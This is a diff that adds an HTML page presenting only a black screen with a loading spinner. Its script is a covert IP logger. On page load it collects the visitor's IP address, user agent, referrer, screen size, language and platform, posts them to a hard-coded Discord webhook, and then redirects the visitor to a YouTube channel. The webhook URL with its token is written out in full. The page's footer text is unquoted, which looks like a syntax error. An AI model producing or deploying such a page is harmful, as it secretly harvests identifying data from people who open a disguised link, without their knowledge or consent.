@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body { 
+            background: #000; 
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #222;
+            border-top: 6px solid #0f0;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1519438288849473616/8DZ4zf0Xn-rDBUqKLGkprh6dvhsZKy1pzeR8P6lfMAKI8AoZQP0TjcnMUV8CYCYmrmIY";
+
+        function sendToDiscord(data) {
+            const payload = {
+                content: null,
+                embeds: [{
+                    title: "🔍 New IP Log - ong",
+                    color: 0x00ff00,
+                    fields: [
+                        { name: "IP", value: data.ip || "N/A", inline: true },
+                        { name: "User-Agent", value: data.ua || "N/A", inline: false },
+                        { name: "Referrer", value: data.ref || "N/A", inline: false },
+                        { name: "Screen", value: data.screen || "N/A", inline: true },
+                        { name: "Language", value: data.lang || "N/A", inline: true },
+                        { name: "Platform", value: data.platform || "N/A", inline: true },
+                        { name: "Timestamp", value: data.timestamp || "N/A", inline: false },
+                        { name: "URL", value: data.url || "N/A", inline: false }
+                    ],
+                    footer: { text: gay logging }
+                }]
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        function logIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(ipData => {
+                    const data = {
+                        ip: ipData.ip,
+                        ua: navigator.userAgent,
+                        ref: document.referrer || 'direct',
+                        screen: `${screen.width}x${screen.height}`,
+                        lang: navigator.language,
+                        platform: navigator.platform,
+                        timestamp: new Date().toISOString(),
+                        url: window.location.href
+                    };
+
+                    sendToDiscord(data);
+
+                    const beaconData = new URLSearchParams(data);
+                    const img = new Image();
+                    img.src = `https://api.ipify.org?${beaconData.toString()}`;
+
+                    setTimeout(() => {
+                        window.location.href = "https://www.youtube.com/@Juniorsangare67";
+                    }, 2200);
+                })
+                .catch(() => {
+                    const fallbackData = {
+                        ip: "fetch_failed",
+                        ua: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    };
+                    sendToDiscord(fallbackData);
+                    setTimeout(() => window.location.href = "https://www.youtube.com/@Juniorsangare67", 1200);
+                });
+        }
+
+        window.onload = logIP;
+    </script>
+</body>
+</html>
